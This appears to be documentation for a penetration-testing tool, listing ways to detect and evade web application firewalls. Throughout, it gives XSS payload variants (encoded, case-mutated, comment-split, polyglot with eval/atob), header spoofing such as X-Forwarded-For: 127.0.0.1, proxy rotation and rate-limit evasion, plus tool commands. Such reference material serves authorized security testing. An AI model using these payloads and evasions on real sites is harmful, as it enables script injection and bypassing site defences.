# WAF Bypass Techniques - TCA-Rex-Version

## Overview

This document details the WAF bypass techniques integrated into TCA-Rex-Version. These methods help penetration testers bypass common Web Application Firewalls during authorized security assessments.

## Detection Methods

### 1. Response Analysis

```
WAF signatures in responses:
- "403 Forbidden"
- "403 Access Denied"
- "You do not have permission"
- "Access blocked by WAF"
- "Suspicious activity detected"
```

### 2. Header Analysis

```
Common WAF headers:
- Server: cloudflare
- Server: ModSecurity
- Server: Imperva
- X-CDN: Akamai
- CF-RAY: CloudFlare
```

### 3. Behavioral Analysis

```
WAF indicators:
- Immediate 403 responses
- Rate limiting (429 status)
- Sudden blocks after initial requests
- Specific error pages
```

## Bypass Techniques

### 1. Encoding Methods

#### Hexadecimal Encoding

```
Original: <script>alert('XSS')</script>
Encoded: 0x3c7363726970743e616c657274282758535327293c2f7363726970743e
```

Usage:
```bash
node index.js waf:bypass --target https://example.com --technique hex
```

#### Unicode Escaping

```
Original: <script>alert('XSS')</script>
Encoded: \u003cscript\u003ealert('XSS')\u003c/script\u003e
```

Usage:
```bash
node index.js waf:bypass --target https://example.com --technique unicode
```

#### Base64 Encoding

```
Original: <script>alert('XSS')</script>
Encoded: PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

Usage:
```bash
node index.js waf:bypass --target https://example.com --technique base64
```

#### URL Encoding

```
Original: <script>alert('XSS')</script>
Encoded: %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```

Usage:
```bash
node index.js waf:bypass --target https://example.com --technique url
```

#### Double URL Encoding

```
Original: ../
Encoded: %252e%252e%252f
```

### 2. Header Manipulation

#### X-Forwarded-For Spoofing

```
Header: X-Forwarded-For: 127.0.0.1

Bypass: Makes request appear to come from local network
```

#### X-Original-IP

```
Header: X-Original-IP: 127.0.0.1

Bypass: Alternative to X-Forwarded-For
```

#### User-Agent Rotation

```
Common User-Agents:
- Mozilla/5.0 (Windows NT 10.0; Win64; x64)
- Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
- Mozilla/5.0 (X11; Linux x86_64)
- Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1)
```

Usage:
```bash
node index.js waf:bypass --target https://example.com --technique user-agent
```

#### Referer Manipulation

```
Legitimate Referers:
- https://google.com
- https://bing.com
- https://duckduckgo.com
```

### 3. Payload Mutation

#### Case Variation

```
Variations:
- <ScRiPt>alert('XSS')</ScRiPt>
- <SCRIPT>alert('XSS')</SCRIPT>
- <script>alert('XSS')</script>
- <sCrIpT>alert('XSS')</sCrIpT>
```

Usage:
```bash
node index.js waf:bypass --target https://example.com --technique case
```

#### Whitespace Injection

```
Variations:
- <script>alert('XSS')</script>
- <script>alert('XSS')</script>
- <\r\nscript>alert('XSS')</script>
- <script\nalert('XSS')</script>
```

#### Comment Insertion

```
Variations:
- <scr/**/ipt>alert('XSS')</script>
- <script>al/**/ert('XSS')</script>
- <!--><script>alert('XSS')</script><!--
- <script>/**/alert('XSS')</script>
```

#### Null Byte Injection

```
Variations:
- <script%00>alert('XSS')</script>
- <script\x00>alert('XSS')</script>
```

#### String Concatenation

```
Original: <script>alert('XSS')</script>
Concatenated: '<' + 'script' + '>alert(1)</script>'
```

### 4. Behavioral Evasion

#### Rate Limiting Bypass

```bash
# Configuration in .env
RATE_LIMIT_DELAY=500        # 500ms between requests
RANDOMIZE_DELAY=true        # Random delays 100-1000ms
```

Usage:
```bash
export RATE_LIMIT_DELAY=1000
node index.js crawl --target https://example.com
```

#### Request Pattern Randomization

```
Techniques:
- Random user agents per request
- Variable referer headers
- Mixed HTTP methods (GET/POST)
- Request body randomization
```

#### IP Rotation

```
Supported Methods:
- Proxy rotation
- VPN switching
- X-Forwarded-For rotation
```

Configuration:
```bash
PROXY_ENABLED=true
PROXY_URL=http://proxy1.com:8080,http://proxy2.com:8080
```

## Advanced Techniques

### Polyglot Payloads

Payloads valid in multiple contexts:

```javascript
// Valid in HTML, JavaScript, and URL contexts
javascript:alert(String.fromCharCode(88,83,83))

// Valid in HTML and JSON
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))">
```

### Context-Aware Encoding

```javascript
// HTML Context
&lt;script&gt;alert('XSS')&lt;/script&gt;

// JavaScript Context
\u003cscript\u003ealert('XSS')\u003c/script\u003e

// URL Context
%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
```

### Mixed Encoding

```
Combination of multiple techniques:
1. Hex encode the payload
2. Base64 encode the result
3. URL encode the final result
4. Wrap in javascript: protocol

Result: javascript:atob('UEhCaGNnWmZhMlY1WDNOMGNtbHU=')...
```

## WAF-Specific Bypasses

### CloudFlare Bypass

```
Techniques:
- X-Forwarded-For: 127.0.0.1
- User-Agent rotation
- Rate limiting adjustment
- Mixed encoding
```

Usage:
```bash
node index.js waf:bypass --target https://example.com --waf cloudflare
```

### ModSecurity Bypass

```
Techniques:
- Comment insertion in SQL
- Case variation
- Whitespace injection
- Polyglot payloads
```

### Imperva Bypass

```
Techniques:
- IP rotation
- Header manipulation
- Request chunking
- Protocol confusion
```

## Testing Workflow

### Step 1: Identify WAF

```bash
node index.js waf:detect --target https://example.com
```

### Step 2: Select Bypass Technique

```bash
node index.js waf:bypass --target https://example.com --technique hex
```

### Step 3: Test Payload

```bash
node index.js detect:xss --target https://example.com --encoding hex
```

### Step 4: Analyze Results

```bash
node index.js report --session bypass-test --format html
```

## Tools & Utilities

### Payload Encoder

```javascript
const Utils = require('./nodejs/src/utils');

// Encode payload
const encoded = Utils.encodePayload(payload, 'hex');
```

### Request Customizer

```bash
# Custom headers
X-Forwarded-For: 127.0.0.1
X-Original-IP: 127.0.0.1
User-Agent: Custom Agent
```

## Limitations & Considerations

1. **Legal Authorization**: Only use on systems with explicit permission
2. **False Positives**: Some techniques may trigger false alarms
3. **WAF Updates**: Techniques may become outdated
4. **Performance**: Multiple encoding can slow requests
5. **Detection Risk**: WAFs may log bypass attempts

## Best Practices

1. **Start Simple**: Test basic techniques first
2. **Combine Techniques**: Use multiple methods together
3. **Monitor Responses**: Watch for WAF indicators
4. **Adjust Timing**: If blocked, increase delays
5. **Document Results**: Record successful techniques
6. **Stay Updated**: Monitor WAF bypass research

## References

- OWASP WAF Bypass Techniques
- HackerOne WAF Reports
- PortSwigger Web Security Academy
- PayloadsAllTheThings GitHub

---

**Disclaimer**: These techniques should only be used for authorized security testing. Unauthorized access to computer systems is illegal.
